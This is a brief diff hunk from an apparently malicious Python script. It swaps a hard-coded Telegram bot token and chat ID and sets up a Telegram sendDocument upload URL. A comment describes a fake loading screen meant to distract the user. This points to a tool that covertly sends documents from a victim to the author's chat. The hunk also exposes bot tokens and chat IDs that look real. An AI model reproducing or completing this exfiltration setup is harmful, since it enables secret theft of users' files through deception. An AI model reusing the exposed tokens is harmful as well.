@@ -14,8 +14,8 @@ luc = "\033[1;32m"
 red = "\033[1;31m"
 
 # Telegram Bot information
-TOKEN = "8162621699:AAGFM0YDmoO7tmCryX_Bo311djoIlvTjbhQ"  # Thay bằng token thật
-CHAT_ID = "7445272108"  # Thay bằng chat ID thật
+TOKEN = "7636168350:AAG9FPUs6X0YeSf0y7MQidiVJk9NmhfJe1s"  # Thay bằng token thật
+CHAT_ID = "6563080552"  # Thay bằng chat ID thật
 TELEGRAM_URL = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
 
 # Fake loading để đánh lạc hướng người dùng
